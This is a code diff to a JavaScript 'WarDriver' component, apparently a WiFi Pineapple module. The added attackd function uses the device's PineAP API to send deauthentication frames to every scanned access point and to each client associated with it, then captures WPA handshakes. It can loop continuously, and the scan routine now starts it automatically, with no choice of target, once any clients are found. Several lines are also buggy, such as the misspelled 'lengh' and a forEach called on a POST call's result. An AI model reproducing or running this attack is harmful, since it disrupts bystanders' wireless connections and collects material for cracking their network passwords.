@@ -442,6 +442,7 @@
             this.apiResponse = 'Unfulfilled Response';
             this.statusHeader = '';
             this.statusFileName = '';
+            this.continousDeauth = false;
         }
         WarDriverComponent.prototype.populateTargetBSSIDs = function () {
             var _this = this;
@@ -475,6 +476,51 @@
             var statusFileName = this.get_status_file_name();
             this.get_status_file(statusFileName);
             //this.render_status();
+        };
+        WarDriverComponent.prototype.attackd = function () {
+            var _this = this;
+            this.API.APIGet('/api/pineap/handshakes', function (resp) {
+                if (resp.handshakes != null) {
+                    _this.scanResultsArray.forEach(function (ap) {
+                        var ap_deauth_payload = {
+                            bssid: ap.bssid,
+                            multiplier: 1,
+                            channel: 11,
+                            clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
+                        };
+                        _this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, function (resp) {
+                            console.log('>ap deauthd: ' + ap.bssid);
+                        }).forEach(function (client) {
+                            var client_deauth_payload = {
+                                bssid: ap.bssid,
+                                mac: client.client_mac,
+                                multiplier: 1,
+                                channel: 11
+                            };
+                            _this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, function (resp) {
+                                console.log('>deauthd: ' + client.client_mac);
+                            });
+                        });
+                    });
+                }
+            });
+            console.log('>cooling down breifly, waiting for straggling handshakes');
+            setTimeout(function () {
+                _this.API.APIPost('/api/pineap/handshakes/stop', null, function (resp) {
+                    console.log('>stopped handshake capture');
+                    _this.API.APIGet('/api/pineap/handshakes', function (resp) {
+                        if (resp.handshakes.lengh > 0) {
+                            console.log('>handshakes found!');
+                        }
+                        else {
+                            console.log('>no handshakes found :(');
+                        }
+                    });
+                });
+            }, 20000);
+            if (this.continousDeauth) {
+                this.attackd();
+            }
         };
         WarDriverComponent.prototype.run_scand = function () {
             var _this = this;
@@ -513,13 +559,13 @@
                                 if (resp.APResults.length > 0) {
                                     resp.APResults.forEach(function (ap) {
                                         if (ap.clients != null) {
-                                            console.log('>apclient');
                                             ap.clients.forEach(function (client) {
                                                 console.log('>client found!: ' + client.client_mac);
+                                                _this.scanResultsArray.push(ap);
                                             });
                                         }
                                         else {
-                                            console.log('>APs found, but not with associated clients');
+                                            console.log('>AP found, but not with associated clients');
                                         }
                                     });
                                 }
@@ -528,12 +574,17 @@
                                 }
                             });
                         }, 120000);
+                        _this.API.APIPost('/api/recon/stop', null, function (resp) { });
                     });
                 });
             });
+            if (this.scanResultsArray.length > 0)
+                this.attackd();
+            else
+                console.log('>sorry, nothing to attack');
         };
         WarDriverComponent.prototype.ngOnInit = function () {
-            this.populateTargetBSSIDs();
+            //this.populateTargetBSSIDs();
             //this.get_status();
             this.run_scand();
         };
